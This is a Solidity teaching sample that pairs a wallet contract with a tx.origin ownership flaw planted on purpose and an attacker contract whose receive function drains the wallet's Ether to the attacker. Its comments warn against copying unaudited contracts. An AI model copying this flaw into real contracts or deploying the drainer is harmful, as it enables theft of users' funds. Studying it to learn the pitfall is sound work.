// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Strings.sol";

/*
This is potentially a vulnerable contract that you use as a code sample from some malicious actor.
They provide a code sample that you copy verbatim without audits.
You deploy this with your account to the blockchain.
*/
contract VulnerableEtherWallet is Ownable {
    constructor() Ownable(tx.origin){} // <-- vulnerability to use tx.origin instead of msg.sender

    function showOwner() external view returns (string memory){
        return Strings.toHexString(owner());
    }

    function withdrawAllEther(address _recipient) external onlyOwner {
        payable(_recipient).transfer(address(this).balance);
    }

    receive() external payable {}
}

interface IEtherWallet {
    function withdrawAllEther(address _recipient) external;
}

/*
Someone provides you with this malicious code so that you use the AttackerContract instead of the VulnerableEtherWallet.
All calls from your account will maliciously execute to send Ether.
DO NOT COPY SOLIDITY CODE VERBATIM WITHOUT AUDITING AND TESTING.
*/
contract AttackerContract is Ownable {
    IEtherWallet private immutable etherWallet; // <-- can only set this once

    constructor(IEtherWallet _etherWallet) Ownable(msg.sender) {
        etherWallet = _etherWallet;
    }

    receive() external payable {
        etherWallet.withdrawAllEther(owner());
    }

}